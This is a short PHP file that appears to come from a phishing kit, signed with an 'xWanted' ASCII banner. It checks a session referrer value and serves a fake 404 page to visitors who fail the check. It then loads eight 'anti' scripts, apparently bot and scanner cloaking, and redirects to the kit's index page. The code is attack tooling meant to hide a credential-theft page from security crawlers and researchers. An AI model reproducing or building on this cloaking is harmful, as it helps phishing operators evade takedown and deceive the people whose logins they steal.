<?php
/*
SH33NZ0 Is Dead 
                      _          _ 
__ ____ __ ____ _ _ _| |_ ___ __| |
\ \ /\ V  V / _` | ' \  _/ -_) _` |
/_\_\ \_/\_/\__,_|_||_\__\___\__,_|
                                   
Now its xWanted Time
*/
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
}else{
                exit(header('HTTP/1.0 404 Not Found'));
    }
  	require 'anti1.php';
	require 'anti2.php';
	require 'anti3.php';
	require 'anti4.php';
	require 'anti5.php';
	require 'anti6.php';
	require 'anti7.php';
	require 'anti8.php';
	exit(header("Location: ../index.php"));
?>